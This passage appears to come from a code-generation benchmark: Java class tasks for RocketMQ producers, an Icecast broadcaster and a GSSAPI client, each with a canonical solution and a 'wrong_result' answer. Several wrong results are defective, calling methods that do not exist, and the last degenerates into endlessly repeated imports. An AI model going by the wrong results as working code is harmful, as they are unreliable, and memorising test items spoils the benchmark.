    "Canonical_solution": "import org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\nimport java.nio.charset.StandardCharsets;\n\npublic class RocketMQProducer {\n\n    private DefaultMQProducer producer;\n    private String namespace;\n    private String producerGroup;\n    private String namesrvAddr;\n    private String topic;\n    private String tag;\n\n    public RocketMQProducer(String namespace, String producerGroup, String namesrvAddr, String topic, String tag) {\n        this.namespace = namespace;\n        this.producerGroup = producerGroup;\n        this.namesrvAddr = namesrvAddr;\n        this.topic = topic;\n        this.tag = tag;\n        this.producer = new DefaultMQProducer(producerGroup);\n    }\n\n    public void initialize() throws Exception {\n        producer.setNamespaceV2(namespace);\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.start();\n    }\n\n    public void sendMessage(String messageContent) throws Exception {\n        Message message = new Message(topic, tag, messageContent.getBytes(StandardCharsets.UTF_8));\n        producer.send(message);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "wrong_result": "public class RocketMQProducer {\n    private final DefaultMQProducer producer;\n    private final String namespace;\n    private final String producerGroup;\n    private final String namesrvAddr;\n    private final String topic;\n    private final String tag;\n\n    public RocketMQProducer(String namespace, String producerGroup, String namesrvAddr, String topic, String tag) {\n        this.namespace = namespace;\n        this.producerGroup = producerGroup;\n        this.namesrvAddr = namesrvAddr;\n        this.topic = topic;\n        this.tag = tag;\n        this.producer = new DefaultMQProducer(producerGroup);\n        producer.setNamespace(namespace);\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.setTopic(topic);\n        producer.setTag(tag);\n    }\n\n    public void initialize() {\n        producer.start();\n    }\n\n    public void sendMessage(String messageContent) {\n        Message message = new Message(topic, tag, messageContent.getBytes());\n        producer.send(message);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}"
  },
  {
    "Task_id": 395,
    "Instruction": "Task Description: Create a Java class that implements an asynchronous message producer using RocketMQ, capable of sending messages to specified topics with callback handling for success and failure cases.\n\nClass Description: RMQAsyncSendProducer is a RocketMQ asynchronous message producer that sends messages to a specified topic and handles responses through callbacks. It tracks successful sends and exceptions, and provides methods for waiting for responses and shutting down the producer.\n\nAttributes:\n- nsAddr: String - The NameServer address for RocketMQ\n- producer: DefaultMQProducer - The RocketMQ producer instance\n- sendCallback: SendCallback - Callback handler for message send results\n- successSendResult: List<SendResult> - Thread-safe list of successful send results\n- exceptionMsgCount: AtomicInteger - Counter for messages that failed to send\n- msgSize: int - The number of messages to send\n- logger: Logger - SLF4J logger instance\n- topic: String - The topic to which messages will be sent (inherited from AbstractMQProducer)\n- msgBodys: [Data Structure] - Stores message bodies (inherited from AbstractMQProducer)\n- originMsgs: [Data Structure] - Stores original messages (inherited from AbstractMQProducer)\n\nMethods:\n- RMQAsyncSendProducer(String nsAddr, String topic) -> void - Constructor that initializes the producer with NameServer address and topic\n- create() -> void - Creates and configures the DefaultMQProducer instance\n- start() -> void - Starts the producer instance\n- asyncSend(Object msg) -> void - Asynchronously sends a single message\n- asyncSend(int msgSize) -> void - Asynchronously sends multiple messages (quantity specified by msgSize)\n- asyncSend(Object msg, MessageQueueSelector selector, Object arg) -> void - Asynchronously sends a message with queue selection\n- waitForResponse(int timeoutMills) -> void - Waits for all responses until timeout\n- shutdown() -> void - Shuts down the producer (overrides AbstractMQProducer method)",
    "Canonical_solution": "import java.nio.charset.StandardCharsets;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.MessageQueueSelector;\nimport org.apache.rocketmq.client.producer.SendCallback;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageQueue;\nimport org.apache.rocketmq.logging.org.slf4j.Logger;\nimport org.apache.rocketmq.logging.org.slf4j.LoggerFactory;\nimport org.apache.rocketmq.test.clientinterface.AbstractMQProducer;\nimport org.apache.rocketmq.test.sendresult.ResultWrapper;\nimport org.apache.rocketmq.test.util.RandomUtil;\nimport org.apache.rocketmq.test.util.TestUtil;\n\npublic class RMQAsyncSendProducer extends AbstractMQProducer {\n    private static Logger logger = LoggerFactory.getLogger(RMQAsyncSendProducer.class);\n    private String nsAddr = null;\n    private DefaultMQProducer producer = null;\n    private SendCallback sendCallback = null;\n    private List<SendResult> successSendResult = Collections.synchronizedList(new ArrayList<SendResult>());\n    private AtomicInteger exceptionMsgCount = new AtomicInteger(0);\n    private int msgSize = 0;\n\n    public RMQAsyncSendProducer(String nsAddr, String topic) {\n        super(topic);\n        this.nsAddr = nsAddr;\n        sendCallback = new SendCallback() {\n            @Override\n            public void onSuccess(SendResult sendResult) {\n                successSendResult.add(sendResult);\n            }\n            @Override\n            public void onException(Throwable throwable) {\n                exceptionMsgCount.getAndIncrement();\n            }\n        };\n        create();\n        start();\n    }\n\n    private void create() {\n        producer = new DefaultMQProducer();\n        producer.setProducerGroup(RandomUtil.getStringByUUID());\n        producer.setInstanceName(RandomUtil.getStringByUUID());\n        if (nsAddr != null) {\n            producer.setNamesrvAddr(nsAddr);\n        }\n    }\n\n    private void start() {\n        try {\n            producer.start();\n        } catch (MQClientException e) {\n            logger.error(\"producer start failed!\");\n            e.printStackTrace();\n        }\n    }\n\n    public void asyncSend(Object msg) {\n        Message metaqMsg = (Message) msg;\n        try {\n            producer.send(metaqMsg, sendCallback);\n            msgBodys.addData(new String(metaqMsg.getBody(), StandardCharsets.UTF_8));\n            originMsgs.addData(msg);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void asyncSend(int msgSize) {\n        this.msgSize = msgSize;\n        for (int i = 0; i < msgSize; i++) {\n            Message msg = new Message(topic, RandomUtil.getStringByUUID().getBytes(StandardCharsets.UTF_8));\n            this.asyncSend(msg);\n        }\n    }\n\n    public void asyncSend(Object msg, MessageQueueSelector selector, Object arg) {\n        Message metaqMsg = (Message) msg;\n        try {\n            producer.send(metaqMsg, selector, arg, sendCallback);\n            msgBodys.addData(new String(metaqMsg.getBody(), StandardCharsets.UTF_8));\n            originMsgs.addData(msg);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void waitForResponse(int timeoutMills) {\n        long startTime = System.currentTimeMillis();\n        while (this.successSendResult.size() != this.msgSize) {\n            if (System.currentTimeMillis() - startTime < timeoutMills) {\n                TestUtil.waitForMonment(100);\n            } else {\n                logger.info(\"timeout but still not recv all response!\");\n                break;\n            }\n        }\n    }\n\n    @Override\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "wrong_result": "public class RMQAsyncSendProducer extends AbstractMQProducer {\n    private String nsAddr;\n    private DefaultMQProducer producer;\n    private SendCallback sendCallback;\n    private final CopyOnWriteArrayList<SendResult> successSendResult = new CopyOnWriteArrayList<>();\n    private final AtomicInteger exceptionMsgCount = new AtomicInteger(0);\n    private int msgSize;\n    private final Logger logger = LoggerFactory.getLogger(RMQAsyncSendProducer.class);\n    private String topic;\n    private Object[] msgBodys;\n    private Object[] originMsgs;\n\n    public RMQAsyncSendProducer(String nsAddr, String topic) {\n        this.nsAddr = nsAddr;\n        this.topic = topic;\n    }\n\n    @Override\n    public void create() {\n        producer = new DefaultMQProducer(\"RMQAsyncSendProducer\");\n        producer.setNamesrvAddr(nsAddr);\n        producer.setTopic(topic);\n    }\n\n    @Override\n    public void start() {\n        producer.start();\n    }\n\n    public void asyncSend(Object msg) {\n        producer.send(msg, sendCallback);\n    }\n\n    public void asyncSend(int msgSize) {\n        this.msgSize = msgSize;\n        for (int i = 0; i < msgSize; i++) {\n            Message message = new Message(topic, \"Tag\", msgBodys[i].toString().getBytes());\n            producer.send(message, sendCallback);\n        }\n    }\n\n    public void asyncSend(Object msg, MessageQueueSelector selector, Object arg) {\n        producer.send(msg, selector, arg, sendCallback);\n    }\n\n    public void waitForResponse(int timeoutMills) {\n        try {\n            Thread.sleep(timeoutMills);\n        } catch (InterruptedException e) {\n            logger.error(\"Wait for response interrupted\", e);\n        }\n    }\n\n    @Override\n    public void shutdown() {\n        producer.shutdown();\n    }\n\n    private final SendCallback sendCallback = new SendCallback() {\n        @Override\n        public void onSuccess(SendResult sendResult) {\n            successSendResult.add(sendResult);\n        }\n\n        @Override\n        public void onException(Throwable throwable) {\n            exceptionMsgCount.incrementAndGet();\n            logger.error(\"Message send failed\", throwable);\n        }\n    };\n}"
  },
  {
    "Task_id": 397,
    "Instruction": "Task Description: Create a Java class that implements an Icecast HTTP audio broadcaster using Apache MINA for TCP client communication. The class should handle connection management, session handling, and error states for streaming audio to an Icecast server.\n\nClass Description: The IcecastHTTPAudioBroadcaster class manages the connection and streaming of audio data to an Icecast server using HTTP over TCP. It handles connection states, authentication, and error recovery while maintaining a persistent session with the server.\n\nAttributes:\n- mLog: Logger - Logger instance for logging events and errors\n- RECONNECT_INTERVAL_MILLISECONDS: long - Time interval between connection attempts (30 seconds)\n- mSocketConnector: NioSocketConnector - MINA socket connector for TCP communication\n- mStreamingSession: IoSession - Current active streaming session\n- mConnecting: AtomicBoolean - Flag indicating if a connection attempt is in progress\n- mLastConnectionAttempt: long - Timestamp of last connection attempt\n\nMethods:\n- IcecastHTTPAudioBroadcaster(IcecastHTTPConfiguration configuration) -> void - Constructor that initializes the broadcaster with configuration\n- connect() -> boolean - Attempts to establish a connection to the Icecast server, returns true if successful\n- disconnect() -> void - Closes the current streaming session and cleans up resources\n- connected() -> boolean - Returns true if currently connected to the server\n- canConnect() -> boolean - Returns true if conditions allow for a connection attempt\n- getBroadcastConfiguration() -> IcecastHTTPConfiguration - Returns the current broadcast configuration\n- setBroadcastState(BroadcastState state) -> void - Updates the current broadcast state\n- getBroadcastState() -> BroadcastState - Returns the current broadcast state\n- getHTTPHeaders() -> Map<String,String> - Returns HTTP headers for the connection\n- getConfiguration() -> IcecastHTTPConfiguration - Returns the configuration object\n\nInner Class:\n- IcecastHTTPIOHandler extends IoHandlerAdapter - Handles MINA session events\n  Methods:\n  - sessionOpened(IoSession session) -> void - Sends HTTP PUT request when session opens\n  - sessionClosed(IoSession session) -> void - Handles session cleanup when closed\n  - exceptionCaught(IoSession session, Throwable throwable) -> void - Handles connection exceptions\n  - messageReceived(IoSession session, Object object) -> void - Processes server responses",
    "Canonical_solution": "import io.github.dsheirer.audio.broadcast.BroadcastState;\nimport io.github.dsheirer.audio.broadcast.icecast.IcecastHTTPConfiguration;\nimport org.apache.mina.core.RuntimeIoException;\nimport org.apache.mina.core.buffer.IoBuffer;\nimport org.apache.mina.core.future.ConnectFuture;\nimport org.apache.mina.core.service.IoHandlerAdapter;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.codec.ProtocolDecoderException;\nimport org.apache.mina.http.HttpClientCodec;\nimport org.apache.mina.http.HttpRequestImpl;\nimport org.apache.mina.http.api.DefaultHttpResponse;\nimport org.apache.mina.http.api.HttpMethod;\nimport org.apache.mina.http.api.HttpVersion;\nimport org.apache.mina.transport.socket.nio.NioSocketConnector;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.net.ConnectException;\nimport java.net.InetSocketAddress;\nimport java.util.Map;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class IcecastHTTPAudioBroadcaster {\n\n    private static final Logger mLog = LoggerFactory.getLogger(IcecastHTTPAudioBroadcaster.class);\n    private static final long RECONNECT_INTERVAL_MILLISECONDS = 30000;\n\n    private NioSocketConnector mSocketConnector;\n    private IoSession mStreamingSession = null;\n    private AtomicBoolean mConnecting = new AtomicBoolean();\n    private long mLastConnectionAttempt = 0;\n\n    public IcecastHTTPAudioBroadcaster(IcecastHTTPConfiguration configuration) {\n        // Constructor logic\n    }\n\n    private boolean connect() {\n        if(!connected() && canConnect() &&\n            (mLastConnectionAttempt + RECONNECT_INTERVAL_MILLISECONDS < System.currentTimeMillis()) &&\n            mConnecting.compareAndSet(false, true))\n        {\n            mLastConnectionAttempt = System.currentTimeMillis();\n\n            if(mSocketConnector == null) {\n                mSocketConnector = new NioSocketConnector();\n                mSocketConnector.setConnectTimeoutCheckInterval(10000);\n                mSocketConnector.getFilterChain().addLast(\"codec\", new HttpClientCodec());\n                mSocketConnector.setHandler(new IcecastHTTPIOHandler());\n            }\n\n            mStreamingSession = null;\n\n            try {\n                ConnectFuture future = mSocketConnector.connect(\n                    new InetSocketAddress(getBroadcastConfiguration().getHost(),\n                    getBroadcastConfiguration().getPort()));\n                future.awaitUninterruptibly();\n                mStreamingSession = future.getSession();\n            } catch(RuntimeIoException rie) {\n                Throwable throwableCause = rie.getCause();\n                if(throwableCause instanceof ConnectException) {\n                    setBroadcastState(BroadcastState.NO_SERVER);\n                } else {\n                    setBroadcastState(BroadcastState.DISCONNECTED);\n                    mLog.debug(\"Failed to connect\", rie);\n                }\n                disconnect();\n            }\n            mConnecting.set(false);\n        }\n        return connected();\n    }\n\n    public void disconnect() {\n        if(mStreamingSession != null) {\n            mStreamingSession.closeNow();\n        }\n    }\n\n    public class IcecastHTTPIOHandler extends IoHandlerAdapter {\n        @Override\n        public void sessionOpened(IoSession session) throws Exception {\n            HttpRequestImpl request = new HttpRequestImpl(HttpVersion.HTTP_1_1, HttpMethod.PUT,\n                getConfiguration().getMountPoint(), \"\", getHTTPHeaders());\n            session.write(request);\n        }\n\n        @Override\n        public void sessionClosed(IoSession session) throws Exception {\n            if(!getBroadcastState().isErrorState()) {\n                setBroadcastState(BroadcastState.DISCONNECTED);\n            }\n            mSocketConnector.dispose();\n            mStreamingSession = null;\n            mSocketConnector = null;\n            mConnecting.set(false);\n        }\n\n        @Override\n        public void exceptionCaught(IoSession session, Throwable throwable) throws Exception {\n            if(throwable instanceof ProtocolDecoderException) {\n                setBroadcastState(BroadcastState.DISCONNECTED);\n            } else {\n                mLog.error(\"Broadcast error\", throwable);\n                setBroadcastState(BroadcastState.DISCONNECTED);\n            }\n            disconnect();\n            mConnecting.set(false);\n        }\n\n        @Override\n        public void messageReceived(IoSession session, Object object) throws Exception {\n            if(object instanceof DefaultHttpResponse) {\n                DefaultHttpResponse response = (DefaultHttpResponse) object;\n                switch(response.getStatus()) {\n                    case SUCCESS_OK:\n                        setBroadcastState(BroadcastState.CONNECTED);\n                        mConnecting.set(false);\n                        break;\n                    case CLIENT_ERROR_UNAUTHORIZED:\n                        setBroadcastState(BroadcastState.INVALID_CREDENTIALS);\n                        break;\n                    case CLIENT_ERROR_FORBIDDEN:\n                        setBroadcastState(BroadcastState.CONFIGURATION_ERROR);\n                        break;\n                    default:\n                        if(!getBroadcastState().isErrorState()) {\n                            setBroadcastState(BroadcastState.ERROR);\n                        }\n                        break;\n                }\n                disconnect();\n            }\n        }\n    }\n\n    // Helper methods (stubs for compilation)\n    private boolean connected() { return false; }\n    private boolean canConnect() { return false; }\n    private IcecastHTTPConfiguration getBroadcastConfiguration() { return null; }\n    private void setBroadcastState(BroadcastState state) {}\n    private BroadcastState getBroadcastState() { return null; }\n    private Map<String,String> getHTTPHeaders() { return null; }\n    private IcecastHTTPConfiguration getConfiguration() { return null; }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 10,
    "wrong_result": "```java\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.codec.ProtocolCodecFilter;\nimport org.apache.mina.filter.codec.textline.TextLineCodecFactory;\nimport org.apache.mina.filter.ssl.SslFilter;\nimport org.apache.mina.filter.timedwrite.TimedWriteFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketConnector;\nimport org.apache.log4j.Logger;\nimport java.net.InetSocketAddress;\nimport java.util.Map;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class IcecastHTTPAudioBroadcaster {\n    private final Logger mLog = Logger.getLogger(IcecastHTTPAudioBroadcaster.class);\n    public static final long RECONNECT_INTERVAL_MILLISECONDS = 30000;\n    private final NioSocketConnector mSocketConnector = new NioSocketConnector();\n    private IoSession mStreamingSession;\n    private final AtomicBoolean mConnecting = new AtomicBoolean(false);\n    private long mLastConnectionAttempt;\n\n    private final IcecastHTTPConfiguration mConfiguration;\n    private BroadcastState mBroadcastState = BroadcastState.DISCONNECTED;\n\n    public IcecastHTTPAudioBroadcaster(IcecastHTTPConfiguration configuration) {\n        mConfiguration = configuration;\n        mSocketConnector.setIdleTime(60, 1000); // 60 seconds\n        mSocketConnector.setHandler(new IcecastHTTPIOHandler());\n        mSocketConnector.getFilterChain().addLast(\"ssl\", new SslFilter());\n        mSocketConnector.getFilterChain().addLast(\"codec\", new ProtocolCodecFilter(new TextLineCodecFactory()));\n        mSocketConnector.getFilterChain().addLast(\"timedWrite\", new TimedWriteFilter());\n    }\n\n    public boolean connect() {\n        if (mConnecting.get() || !canConnect()) {\n            return false;\n        }\n        mLastConnectionAttempt = System.currentTimeMillis();\n        mConnecting.set(true);\n        try {\n            mSocketConnector.connect(new InetSocketAddress(mConfiguration.getHost(), mConfiguration.getPort()));\n            mConnecting.set(false);\n            mBroadcastState = BroadcastState.CONNECTING;\n            return true;\n        } catch (Exception e) {\n            mLog.error(\"Failed to connect to Icecast server\", e);\n            mConnecting.set(false);\n            return false;\n        }\n    }\n\n    public void disconnect() {\n        if (mStreamingSession != null) {\n            mStreamingSession.closeNow();\n            mStreamingSession = null;\n        }\n        mBroadcastState = BroadcastState.DISCONNECTED;\n    }\n\n    public boolean connected() {\n        return mBroadcastState == BroadcastState.CONNECTED;\n    }\n\n    public boolean canConnect() {\n        return !mConnecting.get() && (System.currentTimeMillis() - mLastConnectionAttempt > RECONNECT_INTERVAL_MILLISECONDS);\n    }\n\n    public IcecastHTTPConfiguration getBroadcastConfiguration() {\n        return mConfiguration;\n    }\n\n    public void setBroadcastState(BroadcastState state) {\n        mBroadcastState = state;\n    }\n\n    public BroadcastState getBroadcastState() {\n        return mBroadcastState;\n    }\n\n    public Map<String, String> getHTTPHeaders() {\n        return mConfiguration.getHeaders();\n    }\n\n    public IcecastHTTPConfiguration getConfiguration() {\n        return mConfiguration;\n    }\n\n    private class IcecastHTTPIOHandler extends org.apache.mina.core.handler.IoHandlerAdapter {\n        @Override\n        public void sessionOpened(IoSession session) throws Exception {\n            mStreamingSession = session;\n            mLog.info(\"Connected to Icecast server\");\n            mBroadcastState = BroadcastState.CONNECTED;\n            sendHTTPPutRequest();\n        }\n\n        @Override\n        public void sessionClosed(IoSession session) throws Exception {\n            mLog.warn(\"Session closed with Icecast server\");\n            mBroadcastState = BroadcastState.DISCONNECTED;\n            if (!mConnecting.get()) {\n                mLog.info(\"Attempting to reconnect to Icecast server\");\n                connect();\n            }\n        }\n\n        @Override\n        public void exceptionCaught(IoSession session, Throwable throwable) throws Exception {\n            mLog.error(\"Exception caught during Icecast communication\", throwable);\n            if (!mConnecting.get()) {\n                mLog.info(\"Attempting to reconnect to Icecast server\");\n                connect();\n            }\n        }\n\n        @Override\n        public void messageReceived(IoSession session, Object message) throws Exception {\n            String response = (String) message;\n            mLog.debug(\"Server response: \" + response);\n            if (response.contains(\"200 OK\")) {\n                mBroadcastState = BroadcastState.CONNECTED;\n            } else {\n                mLog.error(\"Server responded with error: \" + response);\n                mBroadcastState = BroadcastState.ERROR;\n            }\n        }\n\n        private void sendHTTPPutRequest() {\n            StringBuilder request = new StringBuilder();\n            request.append(\"PUT /\" + mConfiguration.getMountPoint() + \" HTTP/1.1\\r\\n\");\n            request.append(\"Host: \").append(mConfiguration.getHost()).append(\":\").append(mConfiguration.getPort()).append(\"\\r\\n\");\n            for (Map.Entry<String, String> header : mConfiguration.getHeaders().entrySet()) {\n                request.append(header.getKey()).append(\": \").append(header.getValue()).append(\"\\r\\n\");\n            }\n            request.append(\"\\r\\n\");\n            mStreamingSession.write(request.toString());\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 398,
    "Instruction": "Task Description: Implement a Java class that establishes a secure TCP client connection using GSSAPI for authentication and secure message exchange with a server.\n\nClass Description: The GSSClient class provides functionality to connect to a server using TCP, establish a secure GSSAPI context, send encrypted messages, and verify received messages. It handles GSSAPI authentication and secure communication over a socket connection.\n\nAttributes:\n- s: Socket - The socket used for TCP communication with the server\n\nMethods:\n- main(String[] args) -> void - Entry point that parses command line arguments, establishes connection, and manages the secure communication flow\n- createCtxt(String serverName, Oid mechOid) -> GSSContext - Creates and establishes a GSSAPI security context with the server\n- sendMsgToPeer(GSSContext aCtxt, String msg) -> void - Sends an encrypted message to the server using the established security context\n- verifyMsgFromPeer(GSSContext aCtxt, String msg) -> void - Verifies the message integrity code (MIC) received from the server\n- usage() -> void - Prints usage information for the program\n- print(String msg) -> void - Helper method to print messages to standard output\n- exit(int status) -> void - Closes the socket connection and exits the program with specified status code",
    "Canonical_solution": "import java.io.*;\nimport java.net.*;\n\nimport com.sun.gssapi.*;\n\nclass GSSClient {\n\n    private static Socket s;\n\n    public static void main(String args[]) {\n        String serverHost, serverName, message;\n        int port = 4444;\n\n        if (args.length < 3) {\n            usage();\n            exit(1);\n        }\n\n        serverHost = args[args.length - 3];\n        serverName = args[args.length - 2];\n        message = args[args.length - 1];\n        \n        try {\n            Oid mechOid = GSSManager.getDefaultMech();\n\n            for (int i = 0; i < (args.length - 3); i++) {\n                if (args[i].equals(\"-port\")) {\n                    if (i >= (args.length - 4)) {\n                        usage();\n                        exit(-1);\n                    }\n                    port = Integer.parseInt(args[++i]);\n                } else if (args[i].equals(\"-mech\")) {\n                    if (i >= (args.length-4)) {\n                        usage();\n                        exit(-1);\n                    }\n                    mechOid = new Oid(args[++i]);\n                }\n            }\n\n            s = new Socket(serverHost, port);\n            GSSContext aCtxt = createCtxt(serverName, mechOid);\n            sendMsgToPeer(aCtxt, message);                        \n            verifyMsgFromPeer(aCtxt, message);\n            aCtxt.dispose();\n            exit(0);\n\n        } catch (IOException e) {\n            print(\"\\n**Communication ERROR**:\\t\" + e.getMessage());\n            e.printStackTrace();\n            exit(-1);\n        } catch (GSSException e) {\n            print(\"\\n**GSSAPI ERROR**:\\t\" + e.getMessage());\n            e.printStackTrace();\n            exit(-1);\n        }\n    }\n\n    private static GSSContext createCtxt(String serverName, Oid mechOid)\n                    throws GSSException, IOException {\n        GSSContext aCtxt = new GSSContext(\n            new GSSName(serverName, GSSName.NT_HOSTBASED_SERVICE),\n                      mechOid, null, 0);\n\n        aCtxt.requestConf(true);\n        aCtxt.requestInteg(true);\n        aCtxt.requestMutualAuth(true);\n        aCtxt.requestReplayDet(true);\n        aCtxt.requestSequenceDet(true);\n        \n        DataInputStream dis = new DataInputStream(s.getInputStream());\n        DataOutputStream dos = new DataOutputStream(s.getOutputStream());\n\n        byte []inTok = new byte[0];\n        \n        do {\n            byte[] outTok = aCtxt.init(inTok, 0, inTok.length);\n            \n            if (outTok != null) {\n                dos.writeInt(outTok.length);\n                dos.write(outTok, 0, outTok.length);\n            }\n            \n            if (aCtxt.isEstablished())\n                break;\n            \n            inTok = new byte[dis.readInt()];\n            dis.readFully(inTok, 0, inTok.length);\n        } while (true);\n            \n        return (aCtxt);\n    }\n\n    private static void sendMsgToPeer(GSSContext aCtxt, String msg)\n                throws GSSException, IOException {\n        MessageProp mInfo = new MessageProp(0, true);\n        byte []tok = aCtxt.wrap(msg.getBytes(), 0, msg.length(), mInfo);\n        DataOutputStream dos = new DataOutputStream(s.getOutputStream());\n        dos.writeInt(tok.length);\n        dos.write(tok);\n        dos.flush();\n    }\n\n    private static void verifyMsgFromPeer(GSSContext aCtxt, String msg)\n                throws GSSException, IOException {\n        DataInputStream dis = new DataInputStream(s.getInputStream());\n        int len = dis.readInt();\n        MessageProp mInfo = new MessageProp();\n        aCtxt.verifyMIC(dis, new StringBufferInputStream(msg), mInfo);\n    }\n\n    private static void usage() {\n        print(\"GSSClient [-port port] [-mech 1.2.3.3] serverhost servername message\");\n    }\n\n    private static void print(String msg) {\n        System.out.println(msg);\n    }\n\n    private static void exit(int status) {\n        if (s != null) {\n            try {\n                s.close();\n            } catch (IOException e) {};\n        }\n        System.exit(status);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport javax.security.auth.*;\nimport javax.security.sasl.*;\nimport javax.security.auth.callback.*;\nimport javax.security.auth.kerberos.*;\nimport javax.security.auth.login.*;\nimport javax.security.auth.callback.TextCallbackHandler;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport javax.security.auth.callback.UnsupportedCallbackException;\nimport javax.security.auth.kerberos.KerberosPrincipal;\nimport javax.security.auth.kerberos.KerberosKey;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport javax.security.auth.callback.Callback;\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.callback.NameCallback;\nimport javax.security.auth.callback.PasswordCallback;\nimport 